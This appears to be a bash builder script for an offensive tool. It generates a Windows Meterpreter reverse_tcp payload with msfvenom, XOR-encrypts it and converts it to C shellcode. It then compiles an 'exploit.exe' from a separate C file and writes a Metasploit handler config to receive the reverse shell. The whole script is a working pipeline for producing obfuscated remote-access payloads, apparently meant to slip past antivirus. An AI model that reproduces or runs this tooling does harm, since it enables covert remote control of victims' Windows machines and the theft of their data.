#!/bin/bash


##paylaod = windows/x64/meterpreter/reverse_tcp
##arc = 64
##format = raw_payload


##colours
Red='\e[1;31m'
Green='\e[1;32m'
Ggreen=$'\e[1;32m'


##redirect function for cleaner output
redirect(){
	"$@" &> /dev/null

}


##Variables
echo -n "$Ggreen [-] Enter lhost: ";read LHOST
echo -n "$Ggreen [-] Enter lport: ";read LPORT
PAYLOAD="windows/x64/meterpreter/reverse_tcp"
ENCODER="x64/xor"
FORMAT="raw"
PLATFORM="Windows"
CGEN="tools/c_gen"
ENCRYPTOR="tools/encryptor"
KEYGEN="tools/key_gen"
COMPILER="x86_64-w64-mingw32-gcc"
LISTNER="meta.rc"

##change directory
cd ..
##Create payload
echo -e "${Green} [*]Creating payload"
"$@" &> /dev/null msfvenom -p $PAYLOAD lhost=$LHOST lport=$LPORT -f $FORMAT --platform $PLATFORM > tools/raw_payload.txt

if [[ ! -f "tools/raw_payload.txt" ]]; then
	echo -e "${Red} [*]paylaod creation failed"
else
	echo -e "${Green} [*]Paylaod creation successfull"
fi

##Create key for xor
echo -e "${Green} [*]Creating key for xor operation"

$KEYGEN aabbcc12de tools/raw_key.txt

if [[ ! -f "tools/raw_key.txt" ]]; then
	echo -e "${Red} [*]key creation failed"
else
	
	echo -e  "${Green} [*]Key created successfully"
fi

##Apply xor

echo -e "${Green} [*]Apply xor encryption"
$ENCRYPTOR tools/raw_payload.txt tools/raw_key.txt tools/enc_payload.txt

if [[ ! -f "tools/enc_payload.txt" ]]; then
	echo -e "${Red} [*]Encrypted payload creation failed"
else
	echo -e "${Green} [*]Encrypted payload created successfully"
fi

## convert to c
echo -e "${Green} [*]Converting payload to shellcode"
$CGEN tools/enc_payload.txt tools/enc_shellcode.txt buf
mv tools/enc_shellcode.txt output/
if [[ ! -f "output/enc_shellcode.txt" ]]; then
	echo -e "${Red} [*]Encrypted shellcode creation failed"
else
	echo -e "${Green} [*]Encrypted shellcode created successfully"
fi

echo -e "${Green} [*]Converting raw key to c code"
$CGEN tools/raw_key.txt tools/key.txt key
mv tools/key.txt output/
if [[ ! -f "output/key.txt" ]]; then
	echo -e "${Red} [*]key creation failed"
else
	echo -e "${Green} [*]Key created successfully"
fi


## compiling main exploit
echo -n "$Ggreen [*]Do you want to compile main exploit here[y/n]: ";read option
if [ $option = "y" ]
then
	if which $COMPILER > /dev/null;then
		echo -e "${Green} [*]Compiling main exploit"
		$COMPILER -o exploit.exe main_exploit.c
		mv exploit.exe output/
		echo -e "${Green} [*]Compilation Successfull"
	else
		echo -e "${Red} [*]Mingw can not be found"
		echo -e "${Green} [*]Moving main script"
		cp main_exploit.c output/
	fi
else
	echo -e "${Green} [*]Moving main script"
	cp main_exploit.c output/
	
fi

echo -e "${Green} [*]Everyting is ready in output directory"
echo -e "${Green} [*]Creating Listner"

touch $LISTNER
echo "use exploit/multi/handler" > $LISTNER
echo "set payload $PAYLOAD" >> $LISTNER
echo "set LHOST $LHOST" >> $LISTNER
echo "set LPORT $LPORT" >> $LISTNER
echo "run" >> $LISTNER

rm tools/*.txt

echo -e "${Green} [*]Listner is created"
echo -e "${Green} [*]Building is done"
echo -e "${Green} [*]To start listner run: msfconsole -r meta.rc"


